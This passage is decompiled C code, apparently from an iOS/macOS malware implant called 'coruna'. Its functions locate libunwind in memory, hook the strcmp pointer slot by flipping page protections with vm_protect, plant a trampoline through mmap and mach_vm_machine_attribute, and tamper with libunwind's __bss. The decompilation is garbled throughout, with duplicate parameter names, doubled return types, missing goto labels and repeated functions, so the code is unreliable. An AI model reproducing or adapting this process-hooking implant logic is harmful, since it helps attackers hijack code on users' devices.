                      type_id_8 = scratch + 3;
                      scratch = scratch + 4;
                      if (type_id_8 < scratch) {
                        bootargs[type_id_8] = err + '\x01';
                        err = err + '\x02';
                        goto exit_ok;
                      }
                    }
                  }
                }
                else {
load_ok:
                  bootargs[scratch] = 200;
                  type_id_8 = scratch + 1;
                  if (type_id_8 < scratch + 2) {
                    bootargs[type_id_8] = err;
                    bootargs[scratch + 2] = 0xc9;
                    type_id_8 = scratch + 3;
                    scratch = scratch + 4;
                    if (type_id_8 < scratch) {
                      bootargs[type_id_8] = err + '\x01';
                      err = err + '\x02';
                      goto again;
                    }
                  }
                }
              }
              else {
                bootargs[scratch] = 0x9b;
                type_id_8 = scratch + 1;
                if (type_id_8 < scratch + 2) {
                  bootargs[type_id_8] = err;
                  bootargs[scratch + 2] = 0x9c;
                  type_id_8 = scratch + 3;
                  scratch = scratch + 4;
                  if (type_id_8 < scratch) {
                    bootargs[type_id_8] = err + '\x01';
                    err = err + '\x02';
                    if ((flags_2 >> 8 & 1) != 0) goto load_ok;
                    goto again;
                  }
                }
              }
            }
            else {
              bootargs[scratch] = 0x99;
              type_id_8 = scratch + 1;
              if (type_id_8 < scratch + 2) {
                bootargs[type_id_8] = err;
                bootargs[scratch + 2] = 0x9a;
                type_id_8 = scratch + 3;
                scratch = scratch + 4;
                if (type_id_8 < scratch) {
                  bootargs[type_id_8] = err + '\x01';
                  err = err + '\x02';
                  goto invalid;
                }
              }
            }
          }
          else {
            bootargs[scratch] = 0x97;
            type_id_8 = scratch + 1;
            if (type_id_8 < scratch + 2) {
              bootargs[type_id_8] = err;
              bootargs[scratch + 2] = 0x98;
              type_id_8 = scratch + 3;
              scratch = scratch + 4;
              if (type_id_8 < scratch) {
                bootargs[type_id_8] = err + '\x01';
                err = err + '\x02';
                goto nomem;
              }
            }
          }
        }
        else {
          bootargs[scratch] = 0x95;
          type_id_8 = scratch + 1;
          if (type_id_8 < scratch + 2) {
            bootargs[type_id_8] = err;
            bootargs[scratch + 2] = 0x96;
            type_id_8 = scratch + 3;
            scratch = scratch + 4;
            if (type_id_8 < scratch) {
              bootargs[type_id_8] = err + '\x01';
              err = err + '\x02';
              goto found;
            }
          }
        }
      }
      else {
        bootargs[scratch] = 0x93;
        type_id_8 = scratch + 1;
        if (type_id_8 < scratch + 2) {
          bootargs[type_id_8] = err;
          bootargs[scratch + 2] = 0x94;
          type_id_8 = scratch + 3;
          scratch = scratch + 4;
          if (type_id_8 < scratch) {
            bootargs[type_id_8] = err + '\x01';
            err = err + '\x02';
            goto retry;
          }
        }
      }
skip:
      scratch = type_id_8;
      type_id_8 = 0xad001;
  }
  else {
    err = '\0';
    type_id_8 = 0;
    if ((u != 0x4000000) && (u != 0x2000000)) {
      type_id_8 = 0xad005;
      if (u != 0x3000000) {
        type_id_8 = 0xad014;
      }
    }
  }
parse_ok:
  u = 0;
  if (type_id_8 != 0xad005) {
    u = type_id_8;
  }
  if (kind != 0) {
    u = kind;
  }
  port = (unsigned long)u;
  *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
  return;
  }
  ___stack_chk_fail(port);
}





uint64_t
uint64_t coruna_implant_residual_63(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2, void* arg_x)
{
  uint32_t u;
  uint size;
  int *err;
  uint64_t version;
  int err;
  int *status;
  
  if (arg == 0) {
    return 0xad001;
  }
  if (arg_x == (void (*)0x0) {
    return 0xad001;
  }
  if (((uint)id_2 >> 0x1e & 1) != 0) {
    if (*(int *)(arg + 0x18) != 0) {
      err = (int *)(arg + (unsigned long)*(uint *)(arg + 8));
      do {
        status = err;
        err = status + 2;
      } while (*status != (int)val &&
               status < (int *)(arg +
                               (unsigned long)*(uint *)(arg + (unsigned long)*(uint *)(arg + 0x14) +
                                                (unsigned long)(*(int *)(arg + 0x18) - 1) * 0xc + 8)));
      if (*status == (int)val) {
        err = status[1];
        size = (uint)id_2 >> 0x1c & 3;
        u = 0;
        if (size != 0) {
        size = size - 1;
        if (*(uint *)(arg + 0x10) <= size) {
        return 0xad014;
        }
        u = *(uint32_t *)(arg + (unsigned long)*(uint *)(arg + 0xc) + (unsigned long)size * 4);
        }
        version = (*arg_x)(val,id_2,err,u,0);
        return version;
      }
    }
    return 0xad014;
  }
  err = 0;
fail:
  size = (uint)id_2 >> 0x1c & 3;
  u = 0;
  if (size != 0) {
    size = size - 1;
    if (*(uint *)(arg + 0x10) <= size) {
      return 0xad014;
    }
    u = *(uint32_t *)(arg + (unsigned long)*(uint *)(arg + 0xc) + (unsigned long)size * 4);
  }
  version = (*arg_x)(val,id_2,err,u,0);
  return version;
}





uint64_t
uint64_t coruna_libunwind_lsda_lookup(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, unw_cursor_t *arg)
{
  uint u;
  uint size;
  uint version;
  bool err;
  int err;
  unw_word_t *ptr;
  uint64_t port;
  long handle;
  int *err;
  long addr;
  unsigned long tag;
  long *ptr;
  void (*ptr)(void);
  unw_proc_info_t scratch;
  unw_word_t bootargs;
  
  if (arg == (unw_cursor_t *)0x0) {
    return 0;
  }
  scratch.extra = 0;
  scratch.flags = 0;
  scratch.gp = 0;
  scratch.unwind_info = 0;
  scratch.format = 0;
  scratch.unwind_info_size = 0;
  scratch.end_ip = 0;
  scratch.start_ip = 0;
  scratch.handler = 0;
  scratch.lsda = 0;
  err = _unw_get_proc_info(arg,&scratch);
  if (err != 0) {
    return 0;
  }
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_2c0f8);
  if (err != 0) {
    return 0;
  }
  bootargs = 0;
  err = coruna_find_libunwind_image(&bootargs);
  if (((err == 0) && (bootargs != 0)) && (err = *(int *)(bootargs + 0x10), err != 0)) {
    err = (int *)(bootargs + 0x20);
    do {
      if (*err == 0x2a) {
        err = (int)(scratch.lsda >> 0x20);
        if (*(unsigned long *)(err + 2) < 0x6402200000000) {
          bootargs = scratch.lsda;
          if (k_implant_rodata_word_2c7a0 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_implant_rodata_word_2c7a0 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto fail;
            }
          }
        }
        else {
          bootargs = scratch.lsda;
          if (k_implant_rodata_word_2c7a0 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_implant_rodata_word_2c7a0 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto done;
            }
          }
        }
        break;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_2c0f8);
  return 0;
}





uint64_t
uint64_t coruna_unw_get_proc_info(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, unw_cursor_t *arg)
{
  uint u;
  uint size;
  uint version;
  bool err;
  int err;
  unw_word_t *ptr;
  uint64_t port;
  long handle;
  int *err;
  long addr;
  unsigned long tag;
  long *ptr;
  void (*ptr)(void);
  unw_proc_info_t scratch;
  unw_word_t bootargs;
  
  scratch.extra = 0;
  scratch.flags = 0;
  scratch.gp = 0;
  scratch.unwind_info = 0;
  scratch.format = 0;
  scratch.unwind_info_size = 0;
  scratch.end_ip = 0;
  scratch.start_ip = 0;
  scratch.handler = 0;
  scratch.lsda = 0;
  err = _unw_get_proc_info(arg,&scratch);
  if (err != 0) {
    return 0;
  }
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_2c0f8);
  if (err != 0) {
    return 0;
  }
  bootargs = 0;
  err = coruna_find_libunwind_image(&bootargs);
  if (((err == 0) && (bootargs != 0)) && (err = *(int *)(bootargs + 0x10), err != 0)) {
    err = (int *)(bootargs + 0x20);
    do {
      if (*err == 0x2a) {
        err = (int)(scratch.lsda >> 0x20);
        if (*(unsigned long *)(err + 2) < 0x6402200000000) {
          bootargs = scratch.lsda;
          if (k_implant_rodata_word_2c7a0 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_implant_rodata_word_2c7a0 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto fail;
            }
          }
        }
        else {
          bootargs = scratch.lsda;
          if (k_implant_rodata_word_2c7a0 != 0) {
            u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
            size = (err + -0x60b6453e) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_implant_rodata_word_2c7a0 + 0x18);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto done;
            }
          }
        }
        break;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_2c0f8);
  return 0;
}





uint64_t coruna_sign_extend_uleb(unsigned long *arg,long handle,uint *size,unsigned long arg)
{
  uint64_t u;
  unsigned long scratch;
  unsigned long bootargs;
  
  scratch = 0;
  bootargs = 0;
  u = 0xad001;
  if ((((arg != (unsigned long *)0x0) && (handle != 0)) && (size != (uint *)0x0)) &&
     ((*size < arg &&
      (u = coruna_read_uleb128(&bootargs,&scratch,handle,size,arg), (int)u == 0)))) {
    if ((*(byte *)(handle + (unsigned long)(*size - 1)) >> 6 & 1) == 0) {
      u = 0;
    }
    else {
      u = 0;
      *arg = bootargs | -1L << (scratch & 0x3f);
    }
  }
  return u;
}





uint64_t
uint64_t coruna_msu_mnt1_path(uint64_t *val,uint size,int64_t arg,uint *flags_2,uint64_t id_2,int flags)
{
  unsigned long *ptr;
  uint u;
  unsigned long size;
  bool err;
  uint64_t version;
  uint port;
  unsigned long scratch;
  unsigned long bootargs;
  
  if (val == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (arg == 0) {
    return 0xad001;
  }
  if (flags_2 == (uint *)0x0) {
    return 0xad001;
  }
  port = *flags_2;
  if (id_2 <= port) {
    return 0xad001;
  }
  if (size == 0xff) {
    bootargs = 0;
    version = 0;
    *val = bootargs;
    return version;
  }
  u = size & 0xf;
  version = 0xad008;
  if (0xc < u) {
    return 0xad008;
  }
  ptr = (unsigned long *)(arg + (unsigned long)port);
  switch(u) {
  default:
    scratch = *ptr;
    port = port + 8;
    break;
  }
  err = false;
  bootargs = 0;
  *flags_2 = port;
cleanup:
  port = 0;
  if (flags == 0) {
    port = size & 0x70;
  }
  if (port == 0x10) {
    size = scratch;
    if (!(bool)(u == 0 & (err ^ 1U))) {
      size = bootargs;
    }
    if (u != 0 && !err) {
      size = scratch;
    }
    bootargs = size + (long)ptr;
  }
  else {
    if (port != 0) {
      return 0xad008;
    }
    if (!err) {
      bootargs = scratch;
    }
  }
fail:
  version = 0;
  *val = bootargs;
done:
  return version;
}





uint64_t coruna_read_uleb128(unsigned long *arg,unsigned long *arg,long handle,uint *size,unsigned long val)
{
  byte err;
  byte status;
  unsigned long u;
  uint64_t size;
  unsigned long version;
  byte flags;
  uint port;
  unsigned long tag;
  unsigned long kind;
  
  size = 0xad001;
  if (((arg != (unsigned long *)0x0) && (handle != 0)) && (size != (uint *)0x0)) {
    port = *size;
    kind = (unsigned long)port;
    if (kind < arg) {
      version = 0;
      u = 0;
      flags = 1;
      do {
        tag = u;
        port = port + 1;
        status = *(byte *)(handle + kind);
        version = version | (long)(int)((status & 0x7f) << (unsigned long)((uint)tag & 0x1f));
        err = status >> 7;
        if (0x32 < tag) {
          err = flags;
        }
        *size = port;
      } while ((tag < 0x33) &&
              (kind = (unsigned long)port, u = tag + 7, flags = err,
              (status & 0x80) != 0 && kind < arg));
      if (0x32 < tag || err != 0) {
        return 0xad014;
      }
      size = 0;
      *arg = version;
      *val = tag + 7;
    }
  }
  return size;
}





uint64_t coruna_find_libunwind_image(uint64_t *val)
{
  kern_return_t lk1;
  int err;
  uint64_t u;
  unsigned long size;
  uint64_t *ptr;
  mach_msg_type_number_t scratch;
  long bootargs [2];
  uint32_t thread_attr;
  
  u = 0xad014;
  bootargs[0] = 0;
  bootargs[1] = 0;
  thread_attr = 0;
  scratch = 5;
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    lk1 = _task_info(*(task_name_t *)k_implant_mach_task_self_slot,0x11,(task_info_t)bootargs,
                       &scratch);
    if (lk1 == 0 && scratch == 5) {
      if (((bootargs[0] != 0) && (*(long *)(bootargs[0] + 8) != 0)) &&
         (size = (unsigned long)*(uint *)(bootargs[0] + 4), *(uint *)(bootargs[0] + 4) != 0)) {
        ptr = (uint64_t *)(*(long *)(bootargs[0] + 8) + 8);
        do {
          if (((char *)*ptr != (char *)0x0) &&
             (err = _strcmp((char *)*ptr,"/usr/lib/system/libunwind.dylib"), err == 0)) {
            *val = ptr[-1];
            return 0;
          }
          ptr = ptr + 3;
          size = size - 1;
        } while (size != 0);
        u = 0xad011;
      }
    }
    else {
      u = 0xad00b;
    }
  }
  return u;
}





uint64_t coruna_implant_via_identity(long handle,uint64_t val,pthread_mutex_t *arg)
{
  uint64_t *ptr;
  unsigned long u;
  uint size;
  uint version;
  bool err;
  int err;
  uint64_t port;
  long handle;
  unsigned long tag;
  long addr;
  unsigned long kind;
  uint64_t type_id;
  long scratch;
  pthread_mutex_t *bootargs;
  char thread_attr;
  long host_info;
  uint64_t serial_buf;
  
  type_id = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if ((char)arg[1].__sig == '\0') {
        arg[1].__opaque[0xc] = '\x01';
        arg[1].__opaque[0] = '\0';
        arg[1].__opaque[1] = '\0';
        arg[1].__opaque[2] = '\0';
        arg[1].__opaque[3] = '\0';
        arg[1].__opaque[4] = '\0';
        arg[1].__opaque[5] = '\0';
        arg[1].__opaque[6] = '\0';
        arg[1].__opaque[7] = '\0';
        arg[1].__opaque[8] = '\0';
        arg[1].__opaque[9] = '\0';
        arg[1].__opaque[10] = '\0';
        arg[1].__opaque[0xb] = '\0';
        host_info = 0;
        port = coruna_implant_via_ctx_free_2(handle,val,0,0,&host_info);
        if ((int)port == 0) {
          thread_attr = '\0';
          scratch = handle;
          bootargs = arg;
          if (host_info != 0) {
            if ((*(ushort *)(host_info + 0x1c0) >> 7 & 1) == 0) {
              type_id = coruna_implant_via_fixup_run_exports(host_info,coruna_hook_strcmp,&scratch);
              err = (int)type_id;
joined_r0x0001f5c0:
              if (err == 0) {
                if (thread_attr == '\0') {
                  type_id = 0x18012;
                }
                else {
                  type_id = 0;
                  *(uint8_t *)&arg[1].__sig = 1;
                }
              }
            }
            else {
              addr = *(long *)(host_info + 8);
              tag = 0;
              do {
                if (*(long *)(addr + tag) == -0x55fdfc1e55fefc20) {
                  size = *(uint *)(addr + tag + 8);
                  if ((size & 0x7c000000) == 0x14000000) {
                    u = (unsigned long)(size & 0x1ffffff);
                    if ((size & 0x2000000) != 0) {
                      u = (unsigned long)size | 0xfffffffffe000000;
                    }
                    size = *(uint *)(addr + u * 4 + tag + 8);
                    if (((size & 0x9f000000) == 0x90000000) &&
                       (version = *(uint *)(addr + u * 4 + tag + 0xc),
                       (version & 0x7f000000) == 0x11000000)) {
                      kind = (unsigned long)(version >> 10) & 0xfff;
                      if ((version & 0xc00000) != 0) {
                        kind = kind << 0xc;
                      }
                      ptr = (uint64_t *)
                               ((addr + u * 4 + tag + 8 & 0xfffffffffffff000) +
                                (long)(int)(size >> 0x11 & 0x3000 | (size >> 5) << 0xe) + kind);
                      if (ptr == (uint64_t *)0x0) goto fail;
                      addr = coruna_identity(k_implant_strcmp_slot);
                      handle = coruna_identity(*ptr);
                      if (addr == handle) {
                        serial_buf = 0;
                        type_id = coruna_mach_vm_machine_attribute(arg,handle,&serial_buf);
                        if ((int)type_id == 0) {
                          serial_buf = coruna_identity_80bc(serial_buf,ptr);
                          type_id = coruna_vm_protect(ptr,serial_buf);
                        }
                      }
                      else {
                        type_id = 0;
                      }
                      thread_attr = '\x01';
                      err = (int)type_id;
                      goto joined_r0x0001f5c0;
                    }
                  }
                }
                err = tag < 0x7ffc;
                tag = tag + 4;
              } while (err);
              type_id = 0xad000;
            }
          }
fail:
          coruna_ctx_free(host_info);
          port = type_id;
        }
      }
      else {
        port = 0;
      }
      type_id = port;
      _pthread_mutex_unlock(arg);
    }
    else {
      type_id = 0x18013;
    }
  }
  return type_id;
}





uint32_t coruna_pthread_mutex_init(long handle,pthread_mutex_t *arg)
{
  int err;
  uint32_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    arg[1].__opaque[8] = '\0';
    arg[1].__opaque[9] = '\0';
    arg[1].__opaque[10] = '\0';
    arg[1].__opaque[0xb] = '\0';
    arg[1].__opaque[0xc] = '\0';
    arg[1].__opaque[0xd] = '\0';
    arg[1].__opaque[0xe] = '\0';
    arg[1].__opaque[0xf] = '\0';
    arg->__opaque[0x30] = '\0';
    arg->__opaque[0x31] = '\0';
    arg->__opaque[0x32] = '\0';
    arg->__opaque[0x33] = '\0';
    arg->__opaque[0x34] = '\0';
    arg->__opaque[0x35] = '\0';
    arg->__opaque[0x36] = '\0';
    arg->__opaque[0x37] = '\0';
    arg->__opaque[0x28] = '\0';
    arg->__opaque[0x29] = '\0';
    arg->__opaque[0x2a] = '\0';
    arg->__opaque[0x2b] = '\0';
    arg->__opaque[0x2c] = '\0';
    arg->__opaque[0x2d] = '\0';
    arg->__opaque[0x2e] = '\0';
    arg->__opaque[0x2f] = '\0';
    arg[1].__opaque[0] = '\0';
    arg[1].__opaque[1] = '\0';
    arg[1].__opaque[2] = '\0';
    arg[1].__opaque[3] = '\0';
    arg[1].__opaque[4] = '\0';
    arg[1].__opaque[5] = '\0';
    arg[1].__opaque[6] = '\0';
    arg[1].__opaque[7] = '\0';
    arg[1].__sig = 0;
    arg->__opaque[0x10] = '\0';
    arg->__opaque[0x11] = '\0';
    arg->__opaque[0x12] = '\0';
    arg->__opaque[0x13] = '\0';
    arg->__opaque[0x14] = '\0';
    arg->__opaque[0x15] = '\0';
    arg->__opaque[0x16] = '\0';
    arg->__opaque[0x17] = '\0';
    arg->__opaque[8] = '\0';
    arg->__opaque[9] = '\0';
    arg->__opaque[10] = '\0';
    arg->__opaque[0xb] = '\0';
    arg->__opaque[0xc] = '\0';
    arg->__opaque[0xd] = '\0';
    arg->__opaque[0xe] = '\0';
    arg->__opaque[0xf] = '\0';
    arg->__opaque[0x20] = '\0';
    arg->__opaque[0x21] = '\0';
    arg->__opaque[0x22] = '\0';
    arg->__opaque[0x23] = '\0';
    arg->__opaque[0x24] = '\0';
    arg->__opaque[0x25] = '\0';
    arg->__opaque[0x26] = '\0';
    arg->__opaque[0x27] = '\0';
    arg->__opaque[0x18] = '\0';
    arg->__opaque[0x19] = '\0';
    arg->__opaque[0x1a] = '\0';
    arg->__opaque[0x1b] = '\0';
    arg->__opaque[0x1c] = '\0';
    arg->__opaque[0x1d] = '\0';
    arg->__opaque[0x1e] = '\0';
    arg->__opaque[0x1f] = '\0';
    arg->__opaque[0] = '\0';
    arg->__opaque[1] = '\0';
    arg->__opaque[2] = '\0';
    arg->__opaque[3] = '\0';
    arg->__opaque[4] = '\0';
    arg->__opaque[5] = '\0';
    arg->__opaque[6] = '\0';
    arg->__opaque[7] = '\0';
    arg->__sig = 0;
    err = _pthread_mutex_init(arg,(pthread_mutexattr_t *)0x0);
    u = 0;
    if (err != 0) {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_loader_mutex_lock(long handle,pthread_mutex_t *arg)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if (((char)arg[1].__sig == '\0') || (arg[1].__opaque[0xc] != '\0')) {
        u = 0;
      }
      else if (*(long *)arg[1].__opaque == 0) {
        u = 0;
        arg[1].__opaque[0xc] = '\x01';
      }
      else {
        u = coruna_macho_get_slide(handle,*(uint32_t *)k_implant_mach_task_self_slot,
                             *(long *)arg[1].__opaque,*(uint32_t *)(arg[1].__opaque + 8));
      }
      _pthread_mutex_unlock(arg);
    }
    else {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_hook_strcmp(uint64_t val,mach_vm_address_t *arg,uint64_t *id_2)
{
  int err;
  kern_return_t lk2;
  uint64_t u;
  uint64_t scratch;
  mach_vm_size_t bootargs;
  uint8_t *thread_attr;
  
  if (id_2 == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (arg != (mach_vm_address_t *)0x0) {
    if ((char *)arg[1] == (char *)0x0) {
      return 0;
    }
    err = _strcmp((char *)arg[1],"_strcmp");
    if (err == 0) {
      bootargs = 0;
      thread_attr = (uint8_t *)0x0;
      lk2 = _mach_vm_read_overwrite
                        (*(vm_map_t *)k_implant_mach_task_self_slot,*arg,8,
                         (mach_vm_address_t)&thread_attr,&bootargs);
      if (lk2 != 0 || bootargs != 8) {
        return 0x1800e;
      }
      if (thread_attr == k_implant_strcmp_slot) {
        scratch = 0;
        u = coruna_mach_vm_machine_attribute(id_2[1],*id_2,&scratch);
        if ((int)u == 0) {
          u = coruna_vm_protect(*arg,scratch);
        }
      }
      else {
        u = 0;
      }
      *(uint8_t *)(id_2 + 2) = 1;
      return u;
    }
  }
  return 0;
}





uint64_t coruna_mach_vm_machine_attribute(long handle,long addr_2,long *off_3)
{
  uint8_t *ptr;
  int err;
  void *address;
  uint64_t u;
  vm_machine_attribute_val_t scratch;
  uint8_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) && (off_3 != (long *)0x0)) {
    if (*(long *)(handle + 0x48) == 0) {
      if (addr_2 != 0) {
        u = 0x18011;
        address = (void *)_mmap(0,0x38,3,&k_implant_mmap_anon_fd,0xffffffff,0);
        if (address != (void *)0xffffffffffffffff) {
          _memcpy(address,&k_implant_slot_7000,0x38);
          *(uint8_t **)((long)address + 0x30) = k_implant_strcmp_slot;
          ptr = k_implant_mach_task_self_slot;
          bootargs = 0;
          err = coruna_mlock_range(addr_2,*(uint32_t *)k_implant_mach_task_self_slot,address,0x38,5,
                               &bootargs);
          if (err == 0) {
            scratch = 6;
            _mach_vm_machine_attribute
                      (*(vm_map_t *)ptr,(mach_vm_address_t)address,0x38,1,&scratch);
            u = 0;
            *(void **)(handle + 0x48) = address;
            *(uint32_t *)(handle + 0x50) = 0x38;
            *(uint8_t *)(handle + 0x54) = bootargs;
            *off_3 = (long)address;
          }
          else {
            _munmap(address,0x38);
          }
        }
      }
    }
    else {
      u = 0;
      *off_3 = *(long *)(handle + 0x48);
    }
  }
  return u;
}





unsigned long coruna_vm_protect(uint64_t *arg,uint64_t val)

{
  uint8_t *entry_9;
  uint size;
  uint type_id;
  unsigned long version;
  uint8_t frame;
  uint8_t work;
  vm_prot_t cache_49;
  
  entry_9 = k_implant_mach_task_self_slot;
  if (arg != (uint64_t *)0x0) {
    version = coruna_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot,arg,8,&cache_49,&work
                         ,&frame);
    if ((int)version == 0) {
      if (((byte)cache_49 >> 1 & 1) == 0) {
        size = _vm_protect(*(vm_map_t *)entry_9,(vm_address_t)arg,8,0,3);
        if (size == 0) {
          *arg = val;
          type_id = _vm_protect(*(vm_map_t *)entry_9,(vm_address_t)arg,8,0,cache_49);
          size = 0;
          if (type_id != 0) {
            size = type_id | 0x80000000;
          }
          version = (unsigned long)size;
        }
        else {
          version = (unsigned long)(size | 0x80000000);
        }
      }
      else {
        version = 0;
        *arg = val;
      }
    }
    return version;
  }
  return 0xad001;
}





unsigned long coruna_hook_libunwind_bss(long arg,uint64_t val,pthread_mutex_t *n)

{
  uint8_t *entry_9;
  int status;
  uint type_id;
  char *copy;
  unsigned long port;
  uint64_t type_id_15;
  byte *buf;
  unsigned long type_id_11;
  void *address;
  uint8_t cache_62;
  unsigned long plist;
  unsigned long cache_37;
  
  type_id_11 = 0xad00b;
  if (arg == 0) {
    return 0xad001;
  }
  if (n == (pthread_mutex_t *)0x0) {
    return 0xad001;
  }
  status = _pthread_mutex_lock(n);
  if (status != 0) {
    return 0xad00b;
  }
  if ((char)n[1].__sig != '\0') {
    type_id_11 = 0;
    _pthread_mutex_unlock(n);
    return type_id_11;
  }
  n[1].__opaque[0xc] = '\x01';
  n[1].__opaque[0] = '\0';
  n[1].__opaque[1] = '\0';
  n[1].__opaque[2] = '\0';
  n[1].__opaque[3] = '\0';
  n[1].__opaque[4] = '\0';
  n[1].__opaque[5] = '\0';
  n[1].__opaque[6] = '\0';
  n[1].__opaque[7] = '\0';
  n[1].__opaque[8] = '\0';
  n[1].__opaque[9] = '\0';
  n[1].__opaque[10] = '\0';
  n[1].__opaque[0xb] = '\0';
  cache_37 = 0;
  copy = _getsectdatafromFramework("libunwind.dylib","__DATA","__bss",&cache_37);
  _pthread_mutex_unlock(n);
  return type_id_11;
}





uint32_t coruna_pthread_mutex_init(long handle,pthread_mutex_t *arg)
{
  int err;
  uint32_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    arg[1].__opaque[8] = '\0';
    arg[1].__opaque[9] = '\0';
    arg[1].__opaque[10] = '\0';
    arg[1].__opaque[0xb] = '\0';
    arg[1].__opaque[0xc] = '\0';
    arg[1].__opaque[0xd] = '\0';
    arg[1].__opaque[0xe] = '\0';
    arg[1].__opaque[0xf] = '\0';
    arg->__opaque[0x30] = '\0';
    arg->__opaque[0x31] = '\0';
    arg->__opaque[0x32] = '\0';
    arg->__opaque[0x33] = '\0';
    arg->__opaque[0x34] = '\0';
    arg->__opaque[0x35] = '\0';
    arg->__opaque[0x36] = '\0';
    arg->__opaque[0x37] = '\0';
    arg->__opaque[0x28] = '\0';
    arg->__opaque[0x29] = '\0';
    arg->__opaque[0x2a] = '\0';
    arg->__opaque[0x2b] = '\0';
    arg->__opaque[0x2c] = '\0';
    arg->__opaque[0x2d] = '\0';
    arg->__opaque[0x2e] = '\0';
    arg->__opaque[0x2f] = '\0';
    arg[1].__opaque[0] = '\0';
    arg[1].__opaque[1] = '\0';
    arg[1].__opaque[2] = '\0';
    arg[1].__opaque[3] = '\0';
    arg[1].__opaque[4] = '\0';
    arg[1].__opaque[5] = '\0';
    arg[1].__opaque[6] = '\0';
    arg[1].__opaque[7] = '\0';
    arg[1].__sig = 0;
    arg->__opaque[0x10] = '\0';
    arg->__opaque[0x11] = '\0';
    arg->__opaque[0x12] = '\0';
    arg->__opaque[0x13] = '\0';
    arg->__opaque[0x14] = '\0';
    arg->__opaque[0x15] = '\0';
    arg->__opaque[0x16] = '\0';
    arg->__opaque[0x17] = '\0';
    arg->__opaque[8] = '\0';
    arg->__opaque[9] = '\0';
    arg->__opaque[10] = '\0';
    arg->__opaque[0xb] = '\0';
    arg->__opaque[0xc] = '\0';
    arg->__opaque[0xd] = '\0';
    arg->__opaque[0xe] = '\0';
    arg->__opaque[0xf] = '\0';
    arg->__opaque[0x20] = '\0';
    arg->__opaque[0x21] = '\0';
    arg->__opaque[0x22] = '\0';
    arg->__opaque[0x23] = '\0';
    arg->__opaque[0x24] = '\0';
    arg->__opaque[0x25] = '\0';
    arg->__opaque[0x26] = '\0';
    arg->__opaque[0x27] = '\0';
    arg->__opaque[0x18] = '\0';
    arg->__opaque[0x19] = '\0';
    arg->__opaque[0x1a] = '\0';
    arg->__opaque[0x1b] = '\0';
    arg->__opaque[0x1c] = '\0';
    arg->__opaque[0x1d] = '\0';
    arg->__opaque[0x1e] = '\0';
    arg->__opaque[0x1f] = '\0';
    arg->__opaque[0] = '\0';
    arg->__opaque[1] = '\0';
    arg->__opaque[2] = '\0';
    arg->__opaque[3] = '\0';
    arg->__opaque[4] = '\0';
    arg->__opaque[5] = '\0';
    arg->__opaque[6] = '\0';
    arg->__opaque[7] = '\0';
    arg->__sig = 0;
